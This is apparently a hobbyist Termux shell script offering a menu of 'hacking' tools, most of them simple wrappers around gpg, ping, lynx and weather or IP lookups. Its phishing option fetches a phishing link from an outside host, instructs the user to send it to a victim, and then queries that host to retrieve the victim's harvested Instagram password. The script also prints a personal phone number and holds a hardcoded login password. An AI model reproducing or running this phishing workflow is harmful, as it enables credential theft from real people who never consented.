#!/bin/sh
#url
get_url=$( curl -s http://zlucifer.com/api/hackbae.php)
#variabel fungsi
baner(){
    sleep 2
    echo $green'╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔════╗
║╔═╗║║╔══╝║╔═╗║║╔═╗║║╔══╝║╔╗╔╗║
║╚══╗║╚══╗║║─╚╝║╚═╝║║╚══╗╚╝║║╚╝
╚══╗║║╔══╝║║─╔╗║╔╗╔╝║╔══╝──║║──
║╚═╝║║╚══╗║╚═╝║║║║╚╗║╚══╗──║║──
╚═══╝╚═══╝╚═══╝╚╝╚═╝╚═══╝──╚╝──
'
echo $red'[+]===========================[+]'
echo $red'    Author : D@rk_Devil#6666 '
echo $red'      WA   : 089652884613    '
echo $red'     Type  : Random'
echo $red'   Version : 1.0'
echo $red'[+]===========================[+]'
}
menu(){
    sleep 2
    echo ''
    echo $red'[+]===========================[+]'
    echo    $red'   [1] Encrypt    [6] Weather'
    echo    $red'   [2] Phising    [7] Browsing'
    echo    $red'   [3] File       [8] Ping'
    echo    $red'   [4] Track Ip   [9] Telephon'
    echo    $red'   [5] Web Code  [10] Matrix'
    echo $red'[+]===========================[+]'
    echo ''
    echo -n $red'[*] Choose which one : '
    read fgh
    case $fgh in
    1)sleep 2
    echo $cyan'[*] You Choose Encrypt'
    sleep 2
    clear
    baner
    Encrypt1
    
    ;;
    
    2)sleep 2
    clear
    sleep 2
    baner
    sleep 2
    phising0
    
    ;;
    
    3)sleep 2
    clear
    sleep 2
    baner
    sleep 2
    file1
    
    ;;
    
    4)sleep 2
    clear
    baner
    trackip1
    
    ;;
    
    5)sleep 2
    clear
    baner
    sleep  2
    codeweb
    
    ;;
    
    6)sleep  2
    clear
    sleep 2
    baner
    sleep 2
    cuaca
    
    ;;
    
    7)sleep 2
    pkg install lynx
    clear
    sleep 2
    baner
    sleep 2
    brow
    
    ;;
    
    8)sleep 2
    clear
    sleep 2
    baner 
    sleep 2
    ping8
    
    ;;
    
    9)sleep 2
    clear
    pkg install termux-api
    clear
    sleep 2
    baner
    sleep 2
    telepon9
    
    ;;
    
    10)sleep 2
    clear 
    pkg install cmatrix
    cmatrix
    
    ;;
    
    esac
}
telepon9(){
    echo ''
    echo $cyan'[*] Example : 089652884613'
    echo ''
    echo -n $red'[*] Enter Phone Number : '
    read kamar
    termux-telephony-call $kamar
}
ping8(){
    echo $red'[*] Example       : 192.69.69'
    echo $cyan'[*] Port default  : 500'
    echo ''
    echo -n $red'[*] Ip Address : '
    read ip89
    echo -n $cyan'[*]     Port   : '
    read air
    echo $red'[*] Start pinging to '$ip89
    sleep 2
    Ping -s $air $ip89
    sleep 2
    lagi
}
brow(){
    echo ''
    echo $red'H = Help'
    echo $red'P = Print'
    echo $red'G = Go'
    echo $red'M = Main Screen'
    echo $red'Q = Quit'
    echo $red'[*] Example : Facebook.com'
    echo ''
    echo -n $red'[*] Enter name : '
    read poi
    lynx $poi
}
file1(){
    echo ''
    echo '-d : Create File'
    echo '-f : Create Folder'
    echo '-a : View Database'
    echo ''
    echo -n $red'[*] Choose which one : '
    read file9
    case $file9 in
    -d)sleep 2
    echo -n $cyan'[+] File name : '
    read rcti
    touch $rcti
    echo $red'[*] Succsess created file in'$rcti
    echo ''
    lagi
    
    ;;
    
    -f)sleep 2
    echo -n $cyan'[*] File name : '
    read mnctv
    mkdir $mnctv
    echo $red'[*] Succsess created folder in'$mnctv
    echo ''
    lagi
    
    ;;
    
    -a)sleep 2
    echo -n $red'[*] File name : '
    read kucing
    cat $kucing
    
    ;;
    
    esac
}
phising0(){
    get_url=$( curl -s http://zlucifer.com/api/hackbae.php?requests=skull_api)
    get_url2=$( curl -s http://zlucifer.com/api/hackbae.php?requests=skull)
    cek='curl -s'$get_url2
    zlucifer="user-agent : zlucifer"
    clear
    sleep 2
    echo $cyan'[*] Please wait'
    sleep 2
    clear
    sleep 2
    baner
    response=`curl -H "$zlucifer" -m "240" -s -o /dev/null -w "%{http_code}" $cek`
    if [[ response != *200* ]]; then
        echo 
        echo $red'[*] Website offline/online'
    else
        echo 
        echo 
        echo $cyan'[*] How to use : '
        echo $cyan'1) Copy this link : '$get_url2
        echo $cyan'2) Send the link to the victim'
        echo $cyan'3) Check results'
        echo ''
        echo -n $red'[*] Want to check the target[y/n] : '
        read konfirmasi
        case $konfirmasi in
        y)sleep 2 
        echo $red'[*] Example : Chan.id'
        echo ''
        echo -n $red'[*] Enter the victim id : '
        read victim1
        sleep 2
        echo $cyan'[*] Please wait...'
        sleep 2
        echo $red'[*] Do a password search : '$victim1
        sleep 2
        cek_target=` curl -s $get_url/instagram.php?cari=$victim1`
        echo -e $cek_target
        echo ''
        lagi
        
        ;;
        
        n)sleep 2
        echo $red'[+] Thank you '$nik
        sleep 2 
        exit
        
        ;;
        
        esac
    fi
}
cuaca(){
    echo ''
    echo -n $cyan'[*] Enter your city name : '
    read city1
    curl http://wttr.in/$city1
    echo ''
    lagi
}
codeweb(){
    url1= "view-source:"
    echo ''
    echo -n $cyan'[*] Enter website name : '
    read web1
    curl -s $url1$web1
    echo $cyan'[*] Code found'
    echo ''
    lagi
}
trackip1(){
    echo ''
    echo -n $cyan'[*] Enter the Ip Address : '
    read ip3
    curl http://ip-api.com/$ip3
    echo $red'[*] Ip Address found'
    echo ''
    lagi
}
Encrypt1(){
    sleep 2
    echo ''
    echo $cyan'[+]===========================[+]'
    echo ''
    echo $red'      [1] Encrypt  [2] Depcrypt'
    echo ''
    echo $cyan'[+]===========================[+]'
    echo ''
    echo -n $red'[*] Choose which one : '
    read enc
    case $enc in
    1)sleep 2
    echo $cyan'[*] You choose Encrypt'
    sleep 2
    echo ''
    enc3
    
    ;;
    
    2)sleep 2
    echo $cyan'[*] You choose Depcrypt'
    sleep 2
    echo ''
    Depcrypt1
    
    ;;
    
    esac
}
enc3(){
    echo -n $red'[*] File name : '
    read enc9
    gpg -c $enc9
    echo $cyan'[*] The file has been Encrypt'
    echo ''
    lagi
}
lagi(){
    echo -n $cyan'[*] Want to repeat[y/n] : '
    read lagi5
    case $lagi5 in
    y)sleep 2
    clear
    sleep 2
    baner
    sleep 2
    menu
    
    ;;
    
    n)echo $cyan'[*] Thank you ' $nik
    sleep 2
    exit
    
    ;;
    
    esac
}
Depcrypt1(){
    echo -n $red'[*] File name : '
    read file6
    gpg -d $file6
    echo $red'[*] The file has been Depcrypt'
    echo ''
    lagi
}
#variabel
red="\033[31m"
blue="\033[1;34m"
green="\033[32m"
cyan="\033[1;36m"
yellow="\x1b[1;33m"
#menu utama
clear
sleep 2
echo $red'[+] Starting tools'
sleep 2
clear
echo -n $red'[+] What is your name : '
read nik
sleep 2
clear
sleep 2
echo $red'╔╗───╔═══╗╔═══╗╔══╗╔═╗─╔╗
║║───║╔═╗║║╔═╗║╚╣─╝║║╚╗║║
║║───║║─║║║║─╚╝─║║─║╔╗╚╝║
║║─╔╗║║─║║║║╔═╗─║║─║║╚╗║║
║╚═╝║║╚═╝║║╚╩═║╔╣─╗║║─║║║
╚═══╝╚═══╝╚═══╝╚══╝╚╝─╚═╝To Secret'
echo ''
echo -n $red"Root@$nik:-#"
read pas
case $pas in
Secret666)sleep 2
echo $cyan'[√] Login Succsessful'
sleep 2
clear
sleep 2
baner
sleep 2
menu

;;

*)sleep 2
echo $blue'[!] Login failed'
sleep 2
exit

;;




esac